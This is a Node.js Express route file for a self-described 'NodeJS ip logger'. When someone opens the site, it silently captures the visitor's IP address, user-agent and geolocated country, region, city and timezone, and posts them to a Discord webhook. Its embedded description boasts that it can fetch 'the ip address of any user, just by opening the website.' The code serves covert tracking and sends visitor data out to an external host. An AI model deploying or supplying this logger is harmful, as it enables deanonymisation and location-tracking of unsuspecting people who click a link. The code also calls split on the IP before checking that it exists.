const express = require('express')
const router = express.Router()
const geoip = require('geoip-lite');
const { Webhook, MessageBuilder } = require("discord-webhook-node");
const hook = new Webhook(process.env.WEBHOOK_URI);
const d = new Date();
let date = d.toDateString();

router.get("/", (req, res) => {
  try {
    const ip = req.headers["x-forwarded-for"]
    const SplitIp = ip.split(",")[0];
    const geo = geoip.lookup(SplitIp) || { country: null, region: null, timezone: null, city: null };
    const embed = new MessageBuilder()
      .setTitle("NodeJS ip logger")
      .setAuthor(
        "maxwalks",
        "https://cdn.discordapp.com/attachments/1198679960076959825/1234152158899736717/logo.jpg?ex=662fb144&is=662e5fc4&hm=f87965035d55d0045c6fc480e3b0015f8c9c5d9cbb4bc9e4138e5ecf3405d1c4&",
        "https://www.google.com"
      )
      .setURL("https://www.google.com")
      .addField('Hostname', `${req.hostname}`)
      .addField("Headers", `${req.headers["user-agent"]}`)
      .addField("IP address", `${SplitIp}`, true)
      .addField("country", geo.country)
      .addField("region", geo.region)
      .addField("timezone", geo.timezone)
      .addField("city", geo.city)
      .addField("Request", `**${req.method}** ${req.url}`)
      .setColor(7785669)
      .setDescription(
        "Fetch the ip address of any user, just by opening the website."
      )
      .setFooter(
        "Made by maxwalks",
        "https://cdn.discordapp.com/attachments/1198679960076959825/1234152158899736717/logo.jpg?ex=662fb144&is=662e5fc4&hm=f87965035d55d0045c6fc480e3b0015f8c9c5d9cbb4bc9e4138e5ecf3405d1c4&"
      )
      .setTimestamp();
    if(!ip) {
        hook.send("No ip address detected, server is likely running in localhost. Please use a proxy.")
        console.log(SplitIp)
        res.redirect('/error')
    } else {
        console.log(`${SplitIp} just accessed the site.`)
        console.log(geo)
        hook.send(embed);
        res.redirect('/success')
    }
  } catch (error) {
    console.log(error)
    hook.send(`An error occurred while processing the request: /n ${error}`)
  }
});

router.get('/success', (req, res) => {
    res.status(200).json({ success: "Successfully fetched ip address." })
})

router.get('/error', (req, res) => {
    res.status(500).json({ error: "No ip address detected, server is likely running in localhost. Please use a proxy." })
    hook.send("No ip address detected, server is likely running in localhost. Please use a proxy.")
})

module.exports = router;